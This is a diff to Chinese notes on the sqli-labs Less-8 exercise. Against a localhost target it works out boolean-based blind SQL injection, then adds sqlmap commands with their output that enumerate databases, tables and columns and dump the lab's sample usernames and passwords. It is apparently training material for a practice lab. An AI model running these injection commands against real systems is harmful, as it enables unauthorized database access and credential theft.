@@ -4,6 +4,7 @@ url:http://localhost/sqli/Less-8/?id=1'
 显示：不出现You are in...........的文本
 由此可以判断出可以采用基于布尔值的盲注
 
+方法一（自己编写脚本）：
 编写脚本如Less-8.py所示，主要通过响应内容的长短来判断
 
 表名：
@@ -17,3 +18,56 @@ id,username,password,user,current_connections,total_connections
 字段值：
 dumb:dumb,angelina:i-kill-you,dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
 
+方法二（采用sqlmap）:
+sqlmap -u "http://localhost/sqli/Less-8/?id=1" --technique B --dbs --batch
+爆出数据库名
+available databases [5]:
+[*] challenges
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] security
+sqlmap -u "http://localhost/sqli/Less-8/?id=1" --technique B -D security --tables --batch
+爆出表名
+Database: security
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+
+sqlmap -u "http://localhost/sqli/Less-8/?id=1" --technique B -D security -T users --columns --batch
+爆出字段名
+Database: security
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(3)      |
+| password | varchar(20) |
+| username | varchar(20) |
++----------+-------------+
+sqlmap -u "http://localhost/sqli/Less-8/?id=1" --technique B -D security -T users -C username,password --dump --batch
+爆出字段值
+Database: security
+Table: users
+[13 entries]
++----------+------------+
+| username | password   |
++----------+------------+
+| admin    | admin      |
+| admin1   | admin1     |
+| admin2   | admin2     |
+| admin3   | admin3     |
+| admin4   | admin4     |
+| secure   | crappy     |
+| Dumb     | Dumb       |
+| dhakkan  | dumbo      |
+| superman | genious    |
+| Angelina | I-kill-you |
+| batman   | mob!le     |
+| Dummy    | p@ssword   |
+| stupid   | stupidity  |
++----------+------------+
